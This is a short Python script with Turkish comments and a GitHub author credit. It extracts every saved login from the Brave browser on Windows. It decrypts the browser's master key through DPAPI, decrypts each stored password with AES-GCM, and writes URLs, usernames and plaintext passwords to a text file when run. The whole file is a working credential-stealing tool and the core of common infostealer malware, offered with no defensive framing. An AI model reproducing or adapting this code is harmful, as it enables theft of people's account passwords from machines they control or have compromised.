import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
import win32crypt

# AES anahtarını çözmek için gerekli fonksiyon
def get_brave_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State')
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    
    # Şifrelenmiş AES anahtarı
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    
    # "DPAPI" prefiksi çıkarılıyor
    encrypted_key = encrypted_key[5:]
    
    # AES anahtarı çözülüyor
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Şifreyi çözmek için AES kullanarak şifreyi çözme fonksiyonu
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]  # IV
        encrypted_password = encrypted_password[15:]  # Şifrelenmiş veri
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt_and_verify(encrypted_password[:-16], encrypted_password[-16:])  # Şifreyi çöz
        return decrypted_password.decode('utf-8', errors='replace')  # UTF-8 olarak decode etmeyi dene
    except Exception as e:
        return f"Şifre çözülemedi: {str(e)}"

# Brave şifrelerini almak için ana fonksiyon

def get_brave_passwords():
    # Brave şifrelerinin saklandığı dosyanın yolu
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data')
    if not os.path.exists(db_path):
        print("Login Data dosyası bulunamadı!")
        return

    # Veritabanını kopyala çünkü açık veritabanında işlem yapmak sorun çıkarabilir
    temp_db_path = "BraveLoginData_temp.db"
    shutil.copyfile(db_path, temp_db_path)

    # AES anahtarını al
    key = get_brave_key()

    # SQLite veritabanını aç
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()

    # Şifrelerin bulunduğu tablodan verileri çek
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    with open("brave_passwords.txt", 'w', encoding='utf-8') as f:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            # Şifreyi çöz
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
            else:
                decrypted_password = "Boş şifre"

            # Bilgileri dosyaya yaz
            f.write(f"URL: {url}\n")
            f.write(f"Kullanıcı Adı: {username}\n")
            f.write(f"Şifre: {decrypted_password}\n\n")

    # Veritabanı bağlantısını kapat
    conn.close()
    os.remove(temp_db_path)

    print("Şifreler 'brave_passwords.txt' dosyasına kaydedildi.")

# Brave şifrelerini al
get_brave_passwords()


# Created by TPàshà
# https://www.github.com/TPashaxrd